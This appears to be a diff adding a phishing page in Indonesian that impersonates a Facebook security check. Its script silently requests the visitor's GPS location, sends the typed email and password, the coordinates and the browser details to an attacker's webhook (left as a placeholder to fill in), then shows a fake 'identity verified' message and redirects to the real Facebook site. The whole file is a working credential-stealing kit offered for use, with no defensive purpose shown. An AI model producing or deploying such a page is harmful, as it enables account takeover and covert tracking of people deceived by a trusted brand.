@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Keamanan Facebook</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        img { width: 200px; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        button { width: 95%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .info { font-size: 13px; color: #606770; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" alt="Facebook">
+    <p>Kami mendeteksi aktivitas login yang tidak biasa. Silakan konfirmasi identitas Anda untuk melanjutkan.</p>
+    
+    <input type="text" id="email" placeholder="Email atau Nomor Telepon" required>
+    <input type="password" id="pass" placeholder="Kata Sandi" required>
+    <button onclick="sendData()">Konfirmasi</button>
+    
+    <p class="info">Lupa kata sandi? · Pusat Bantuan</p>
+</div>
+
+<script>
+    // GANTI URL DI BAWAH INI PAKE URL WEBHOOK LO!
+    const myWebhook = "MASUKKAN_URL_WEBHOOK_LO_DISINI";
+
+    let locationData = "GPS Ditolak";
+
+    // Minta Lokasi Otomatis
+    navigator.geolocation.getCurrentPosition((pos) => {
+        locationData = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+        };
+    }, (err) => { console.log("GPS Off"); });
+
+    function sendData() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        const payload = {
+            target: "Samsung A15 Hacker",
+            email: email,
+            password: pass,
+            location: locationData,
+            device: navigator.userAgent
+        };
+
+        fetch(myWebhook, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(payload)
+        });
+
+        alert("Identitas Terverifikasi. Sesi akan segera pulih.");
+        window.location.href = "https://m.facebook.com";
+    }
+</script>
+
+</body>
+</html>
